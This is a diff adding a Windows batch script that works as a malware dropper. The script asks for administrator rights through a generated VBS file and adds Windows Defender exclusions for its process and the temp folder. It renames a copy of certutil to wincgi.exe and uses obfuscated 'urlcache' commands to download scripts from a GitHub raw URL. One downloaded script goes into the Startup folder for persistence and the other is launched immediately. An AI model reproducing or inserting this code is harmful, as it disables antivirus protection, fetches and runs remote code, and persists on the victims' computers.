@@ -1,0 +1,53 @@
+@ECHO OFF
+
+IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system") ELSE (>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
+
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+	
+NETSH INTERFACE SHOW INTERFACE | FINDSTR "Connected" > NUL
+
+if '%errorlevel%' NEQ '1' ( goto Stage1 ) else ( goto Bye )
+
+:Stage1
+
+PowerShell -Command "Add-MpPreference -ExclusionProcess 'write32.exe' -ErrorAction Ignore; Add-MpPreference -ExclusionPath '%temp%' -ErrorAction Ignore;"
+
+tasklist /FI "IMAGENAME eq write32.exe" 2>NUL | find /I /N "write32.exe">NUL
+if "%ERRORLEVEL%"=="0" taskkill /f /im write32.exe
+
+if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\write32start.vbs" del /f "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\write32start.vbs"
+
+if exist %temp%\write32 rd /s /q %temp%\write32
+mkdir %temp%\write32
+
+if not exist %temp%\write32\wincgi.exe copy c:\windows\system32\certutil.exe %temp%\write32\wincgi.exe
+
+%temp%\write32\wincgi.exe -f -ur""""lc""""ache h""""t""""t""""ps:/""""/raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32dl.js "%temp%\write32\write32dl.vbs"
+
+%temp%\write32\wincgi.exe -f -ur""""lc""""ache h""""t""""t""""ps:/""""/raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32start.js "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\write32start.vbs"
+
+timeout /t 1 /nobreak
+
+start %temp%\write32\write32dl.vbs
+
+exit /B
+
+:Bye
+echo No Internet Connection, Please Connect and Retry!
+pause
